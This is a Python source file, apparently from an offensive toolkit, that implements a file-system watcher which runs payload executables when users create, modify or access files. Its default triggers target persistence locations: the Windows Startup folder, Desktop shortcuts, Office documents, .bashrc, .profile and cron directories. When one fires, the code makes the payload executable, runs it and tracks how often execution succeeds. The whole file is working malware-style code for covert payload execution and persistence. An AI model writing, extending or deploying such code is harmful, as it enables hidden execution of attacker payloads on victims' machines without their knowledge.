"""
File Monitoring and Trigger System
Monitors file system activity and triggers payloads based on user interactions
"""

import os
import time
import logging
import threading
import hashlib
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass
from pathlib import Path
import json
import platform
import subprocess

logger = logging.getLogger(__name__)

@dataclass
class FileTrigger:
    """Represents a file-based trigger configuration"""
    name: str
    file_pattern: str
    trigger_type: str  # 'create', 'modify', 'access', 'delete'
    payload_path: str
    conditions: Dict[str, Any]
    enabled: bool = True
    cooldown: int = 60  # seconds between triggers

@dataclass
class TriggerEvent:
    """Represents a trigger event"""
    timestamp: float
    trigger_name: str
    file_path: str
    event_type: str
    payload_executed: bool
    execution_result: Optional[str] = None

class FileMonitor:
    """Monitors file system activity and executes triggers"""
    
    def __init__(self, config_path: str = None):
        self.config_path = config_path or "config/triggers.yaml"
        self.triggers: Dict[str, FileTrigger] = {}
        self.monitoring_threads: Dict[str, threading.Thread] = {}
        self.is_monitoring = False
        self.trigger_events: List[TriggerEvent] = []
        self.last_trigger_time: Dict[str, float] = {}
        
        # Platform-specific monitoring
        self.platform = platform.system().lower()
        
        self._load_triggers()
        self._setup_default_triggers()
    
    def _load_triggers(self):
        """Load trigger configurations"""
        try:
            import yaml
            config_path = Path(self.config_path)
            if config_path.exists():
                with open(config_path, 'r') as f:
                    config = yaml.safe_load(f)
                
                for trigger_name, trigger_data in config.get('triggers', {}).items():
                    self.triggers[trigger_name] = FileTrigger(
                        name=trigger_name,
                        file_pattern=trigger_data.get('file_pattern', ''),
                        trigger_type=trigger_data.get('trigger_type', 'modify'),
                        payload_path=trigger_data.get('payload_path', ''),
                        conditions=trigger_data.get('conditions', {}),
                        enabled=trigger_data.get('enabled', True),
                        cooldown=trigger_data.get('cooldown', 60)
                    )
        except Exception as e:
            logger.warning(f"Failed to load triggers: {e}")
    
    def _setup_default_triggers(self):
        """Setup default file triggers based on platform"""
        if not self.triggers:
            if self.platform == 'windows':
                self._setup_windows_triggers()
            else:
                self._setup_linux_triggers()
    
    def _setup_windows_triggers(self):
        """Setup Windows-specific file triggers"""
        default_triggers = {
            'desktop_shortcut': {
                'name': 'Desktop Shortcut Trigger',
                'file_pattern': '*.lnk',
                'trigger_type': 'create',
                'payload_path': 'payloads/desktop_trigger.exe',
                'conditions': {'path_contains': 'Desktop'},
                'enabled': True,
                'cooldown': 300
            },
            'office_document': {
                'name': 'Office Document Trigger',
                'file_pattern': '*.doc*',
                'trigger_type': 'modify',
                'payload_path': 'payloads/office_trigger.exe',
                'conditions': {'file_size_min': 1000},
                'enabled': True,
                'cooldown': 180
            },
            'startup_folder': {
                'name': 'Startup Folder Trigger',
                'file_pattern': '*',
                'trigger_type': 'create',
                'payload_path': 'payloads/startup_trigger.exe',
                'conditions': {'path_contains': 'Startup'},
                'enabled': True,
                'cooldown': 600
            }
        }
        
        for trigger_name, trigger_data in default_triggers.items():
            self.triggers[trigger_name] = FileTrigger(**trigger_data)
    
    def _setup_linux_triggers(self):
        """Setup Linux-specific file triggers"""
        default_triggers = {
            'bashrc_modify': {
                'name': 'Bashrc Modification Trigger',
                'file_pattern': '.bashrc',
                'trigger_type': 'modify',
                'payload_path': 'payloads/bashrc_trigger.sh',
                'conditions': {'path_contains': 'home'},
                'enabled': True,
                'cooldown': 300
            },
            'profile_access': {
                'name': 'Profile Access Trigger',
                'file_pattern': '.profile',
                'trigger_type': 'access',
                'payload_path': 'payloads/profile_trigger.sh',
                'conditions': {'path_contains': 'home'},
                'enabled': True,
                'cooldown': 180
            },
            'cron_modify': {
                'name': 'Cron Modification Trigger',
                'file_pattern': 'crontab',
                'trigger_type': 'modify',
                'payload_path': 'payloads/cron_trigger.sh',
                'conditions': {'path_contains': 'cron'},
                'enabled': True,
                'cooldown': 600
            }
        }
        
        for trigger_name, trigger_data in default_triggers.items():
            self.triggers[trigger_name] = FileTrigger(**trigger_data)
    
    def start_monitoring(self, paths: List[str] = None):
        """Start file system monitoring"""
        if self.is_monitoring:
            logger.warning("File monitoring already active")
            return
        
        if paths is None:
            paths = self._get_default_monitor_paths()
        
        self.is_monitoring = True
        logger.info("Starting file system monitoring")
        
        for path in paths:
            if os.path.exists(path):
                thread = threading.Thread(
                    target=self._monitor_directory,
                    args=(path,),
                    daemon=True
                )
                thread.start()
                self.monitoring_threads[path] = thread
                logger.info(f"Started monitoring: {path}")
            else:
                logger.warning(f"Path does not exist: {path}")
    
    def _get_default_monitor_paths(self) -> List[str]:
        """Get default paths to monitor based on platform"""
        if self.platform == 'windows':
            return [
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Downloads'),
                os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
            ]
        else:
            return [
                os.path.expanduser('~'),
                '/etc/cron.d',
                '/var/spool/cron'
            ]
    
    def _monitor_directory(self, directory: str):
        """Monitor a specific directory for file changes"""
        try:
            if self.platform == 'windows':
                self._monitor_windows(directory)
            else:
                self._monitor_linux(directory)
        except Exception as e:
            logger.error(f"Directory monitoring failed for {directory}: {e}")
    
    def _monitor_windows(self, directory: str):
        """Windows-specific file monitoring using PowerShell"""
        try:
            # Use PowerShell to monitor file system events
            ps_script = f'''
            $watcher = New-Object System.IO.FileSystemWatcher
            $watcher.Path = "{directory}"
            $watcher.Filter = "*"
            $watcher.IncludeSubdirectories = $true
            $watcher.EnableRaisingEvents = $true

            $action = {{
                $path = $Event.SourceEventArgs.FullPath
                $changeType = $Event.SourceEventArgs.ChangeType
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Write-Output "$timestamp|$changeType|$path"
            }}

            Register-ObjectEvent $watcher "Created" -Action $action
            Register-ObjectEvent $watcher "Changed" -Action $action
            Register-ObjectEvent $watcher "Deleted" -Action $action
            Register-ObjectEvent $watcher "Renamed" -Action $action

            while ($true) {{
                Start-Sleep -Seconds 1
            }}
            '''
            
            # Start PowerShell monitoring
            process = subprocess.Popen(
                ['powershell', '-Command', ps_script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while self.is_monitoring:
                line = process.stdout.readline()
                if line:
                    self._process_file_event(line.strip())
                time.sleep(0.1)
            
            process.terminate()
            
        except Exception as e:
            logger.error(f"Windows monitoring failed: {e}")
    
    def _monitor_linux(self, directory: str):
        """Linux-specific file monitoring using inotify"""
        try:
            # Use inotify-tools if available
            cmd = [
                'inotifywait', '-m', '-r', '-e', 'create,modify,delete,move',
                '--format', '%T|%e|%w%f', directory
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            while self.is_monitoring:
                line = process.stdout.readline()
                if line:
                    self._process_file_event(line.strip())
                time.sleep(0.1)
            
            process.terminate()
            
        except FileNotFoundError:
            # Fallback to polling if inotify-tools not available
            logger.warning("inotify-tools not found, using polling fallback")
            self._monitor_linux_polling(directory)
        except Exception as e:
            logger.error(f"Linux monitoring failed: {e}")
    
    def _monitor_linux_polling(self, directory: str):
        """Fallback polling-based monitoring for Linux"""
        file_states = {}
        
        while self.is_monitoring:
            try:
                current_files = {}
                
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            stat = os.stat(file_path)
                            current_files[file_path] = {
                                'mtime': stat.st_mtime,
                                'size': stat.st_size
                            }
                        except OSError:
                            continue
                
                # Check for changes
                for file_path, current_state in current_files.items():
                    if file_path in file_states:
                        old_state = file_states[file_path]
                        if (current_state['mtime'] != old_state['mtime'] or 
                            current_state['size'] != old_state['size']):
                            self._process_file_event(f"{time.time()}|MODIFY|{file_path}")
                    else:
                        self._process_file_event(f"{time.time()}|CREATE|{file_path}")
                
                # Check for deletions
                for file_path in file_states:
                    if file_path not in current_files:
                        self._process_file_event(f"{time.time()}|DELETE|{file_path}")
                
                file_states = current_files
                time.sleep(2)  # Poll every 2 seconds
                
            except Exception as e:
                logger.error(f"Polling monitoring error: {e}")
                time.sleep(5)
    
    def _process_file_event(self, event_line: str):
        """Process a file system event"""
        try:
            parts = event_line.split('|')
            if len(parts) >= 3:
                timestamp_str, event_type, file_path = parts[:3]
                
                # Convert timestamp
                try:
                    timestamp = float(timestamp_str)
                except ValueError:
                    timestamp = time.time()
                
                # Check triggers
                self._check_triggers(file_path, event_type, timestamp)
                
        except Exception as e:
            logger.error(f"Failed to process file event: {e}")
    
    def _check_triggers(self, file_path: str, event_type: str, timestamp: float):
        """Check if any triggers should be activated"""
        for trigger_name, trigger in self.triggers.items():
            if not trigger.enabled:
                continue
            
            # Check cooldown
            if trigger_name in self.last_trigger_time:
                if timestamp - self.last_trigger_time[trigger_name] < trigger.cooldown:
                    continue
            
            # Check file pattern
            if not self._matches_pattern(file_path, trigger.file_pattern):
                continue
            
            # Check trigger type
            if not self._matches_trigger_type(event_type, trigger.trigger_type):
                continue
            
            # Check conditions
            if not self._check_conditions(file_path, trigger.conditions):
                continue
            
            # Execute trigger
            self._execute_trigger(trigger, file_path, timestamp)
    
    def _matches_pattern(self, file_path: str, pattern: str) -> bool:
        """Check if file path matches pattern"""
        if not pattern or pattern == '*':
            return True
        
        file_name = os.path.basename(file_path)
        
        # Simple wildcard matching
        if '*' in pattern:
            import fnmatch
            return fnmatch.fnmatch(file_name, pattern)
        
        return file_name == pattern
    
    def _matches_trigger_type(self, event_type: str, trigger_type: str) -> bool:
        """Check if event type matches trigger type"""
        type_mapping = {
            'CREATE': 'create',
            'MODIFY': 'modify',
            'DELETE': 'delete',
            'ACCESS': 'access'
        }
        
        mapped_type = type_mapping.get(event_type.upper(), event_type.lower())
        return mapped_type == trigger_type
    
    def _check_conditions(self, file_path: str, conditions: Dict[str, Any]) -> bool:
        """Check if file meets trigger conditions"""
        try:
            for condition, value in conditions.items():
                if condition == 'path_contains':
                    if value not in file_path:
                        return False
                
                elif condition == 'file_size_min':
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size < value:
                            return False
                    except OSError:
                        return False
                
                elif condition == 'file_size_max':
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > value:
                            return False
                    except OSError:
                        return False
                
                elif condition == 'file_extension':
                    if not file_path.lower().endswith(value.lower()):
                        return False
            
            return True
            
        except Exception as e:
            logger.error(f"Condition check failed: {e}")
            return False
    
    def _execute_trigger(self, trigger: FileTrigger, file_path: str, timestamp: float):
        """Execute a trigger payload"""
        try:
            logger.info(f"Executing trigger: {trigger.name} for file: {file_path}")
            
            # Update last trigger time
            self.last_trigger_time[trigger.name] = timestamp
            
            # Check if payload exists
            if not os.path.exists(trigger.payload_path):
                logger.warning(f"Payload not found: {trigger.payload_path}")
                self._record_trigger_event(trigger.name, file_path, 'modify', False, "Payload not found")
                return
            
            # Execute payload
            if self.platform == 'windows':
                result = self._execute_windows_payload(trigger.payload_path)
            else:
                result = self._execute_linux_payload(trigger.payload_path)
            
            success = result['success']
            output = result.get('output', '')
            
            self._record_trigger_event(trigger.name, file_path, 'modify', success, output)
            
            if success:
                logger.info(f"Trigger {trigger.name} executed successfully")
            else:
                logger.warning(f"Trigger {trigger.name} execution failed: {output}")
                
        except Exception as e:
            logger.error(f"Trigger execution failed: {e}")
            self._record_trigger_event(trigger.name, file_path, 'modify', False, str(e))
    
    def _execute_windows_payload(self, payload_path: str) -> Dict[str, Any]:
        """Execute Windows payload"""
        try:
            result = subprocess.run(
                [payload_path],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Execution timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_linux_payload(self, payload_path: str) -> Dict[str, Any]:
        """Execute Linux payload"""
        try:
            # Make executable if needed
            os.chmod(payload_path, 0o755)
            
            result = subprocess.run(
                [payload_path],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Execution timeout'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _record_trigger_event(self, trigger_name: str, file_path: str, 
                            event_type: str, payload_executed: bool, 
                            execution_result: str = None):
        """Record a trigger event"""
        event = TriggerEvent(
            timestamp=time.time(),
            trigger_name=trigger_name,
            file_path=file_path,
            event_type=event_type,
            payload_executed=payload_executed,
            execution_result=execution_result
        )
        
        self.trigger_events.append(event)
        
        # Keep only last 1000 events
        if len(self.trigger_events) > 1000:
            self.trigger_events = self.trigger_events[-1000:]
    
    def stop_monitoring(self):
        """Stop file system monitoring"""
        self.is_monitoring = False
        logger.info("Stopping file system monitoring")
        
        # Wait for monitoring threads to finish
        for thread in self.monitoring_threads.values():
            thread.join(timeout=5)
        
        self.monitoring_threads.clear()
    
    def add_trigger(self, trigger: FileTrigger):
        """Add a new file trigger"""
        self.triggers[trigger.name] = trigger
        logger.info(f"Added trigger: {trigger.name}")
    
    def remove_trigger(self, trigger_name: str):
        """Remove a file trigger"""
        if trigger_name in self.triggers:
            del self.triggers[trigger_name]
            logger.info(f"Removed trigger: {trigger_name}")
        else:
            logger.warning(f"Trigger not found: {trigger_name}")
    
    def get_trigger_stats(self) -> Dict[str, Any]:
        """Get statistics about trigger events"""
        if not self.trigger_events:
            return {}
        
        total_events = len(self.trigger_events)
        successful_executions = sum(1 for event in self.trigger_events if event.payload_executed)
        
        trigger_stats = {}
        for trigger_name in self.triggers:
            trigger_events = [e for e in self.trigger_events if e.trigger_name == trigger_name]
            if trigger_events:
                trigger_stats[trigger_name] = {
                    'total_events': len(trigger_events),
                    'successful_executions': sum(1 for e in trigger_events if e.payload_executed),
                    'success_rate': sum(1 for e in trigger_events if e.payload_executed) / len(trigger_events)
                }
        
        return {
            'total_events': total_events,
            'successful_executions': successful_executions,
            'overall_success_rate': successful_executions / total_events if total_events > 0 else 0,
            'trigger_stats': trigger_stats,
            'recent_events': [event.__dict__ for event in self.trigger_events[-10:]]
        }
    
    def save_trigger_events(self, output_path: str = "results/trigger_events.json"):
        """Save trigger events to file"""
        try:
            output_dir = Path(output_path).parent
            output_dir.mkdir(exist_ok=True)
            
            events_data = [event.__dict__ for event in self.trigger_events]
            
            with open(output_path, 'w') as f:
                json.dump(events_data, f, indent=2)
            
            logger.info(f"Trigger events saved to {output_path}")
        except Exception as e:
            logger.error(f"Failed to save trigger events: {e}") 